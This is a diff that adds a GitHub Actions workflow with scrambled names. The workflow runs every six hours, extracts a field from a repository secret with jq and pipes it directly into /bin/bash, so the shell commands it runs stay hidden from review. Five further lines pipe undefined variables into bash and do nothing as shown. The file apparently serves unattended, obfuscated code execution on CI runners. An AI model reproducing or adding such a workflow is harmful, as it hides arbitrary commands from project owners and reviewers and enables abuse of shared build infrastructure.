@@ -1,0 +1,21 @@
+name: lanxinyue1928
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lanxinyue1928
+        env:
+          mjxrb971: ${{ secrets.mjxrb971 }}
+        run: |
+          echo $mjxrb971 | jq -r .vjns8385 | /bin/bash
+          echo $kphj597 | jq -r .lkcz5743 | /bin/bash
+          echo $bw4 | jq -r .qvjuw0327 | /bin/bash
+          echo $gzryb2 | jq -r .zl90538 | /bin/bash
+          echo $ev44 | jq -r .l9130 | /bin/bash
+          echo $yl47359 | jq -r .xqo5 | /bin/bash
+
